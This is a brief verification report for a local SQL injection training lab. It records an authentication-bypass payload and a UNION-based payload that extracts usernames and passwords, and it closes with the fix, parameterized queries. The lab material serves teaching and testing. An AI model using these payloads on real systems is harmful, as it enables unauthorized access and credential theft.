# SQL Injection Lab — Verification Report

**Date:** October 10, 2026
**Environment:** Kali Linux, Apache2, PHP, MariaDB, Firefox

## Test 1 — Challenge 1 Baseline
Input: admin / wrong password → Result: "Login failed." (expected)

## Test 2 — Challenge 1 Exploitation (Bypass)
Payload: `admin' -- -`
Result: "Login successful! Welcome, admin (role: admin)" — authentication bypassed.

## Test 3 — Challenge 2 Baseline
Input: `?q=Welcome` → Result: Returns "Welcome Post" correctly.

## Test 4 — Challenge 2 Exploitation (UNION Extraction)
Payload: `?q=xyz' UNION SELECT username, password FROM users -- -`
Result: Leaked `admin`/`SuperSecret123` and `guest`/`guestpass`.

## Summary
Both challenges verified working end-to-end. Vulnerability: unsanitized string concatenation in SQL queries. Fix: use parameterized queries/prepared statements.
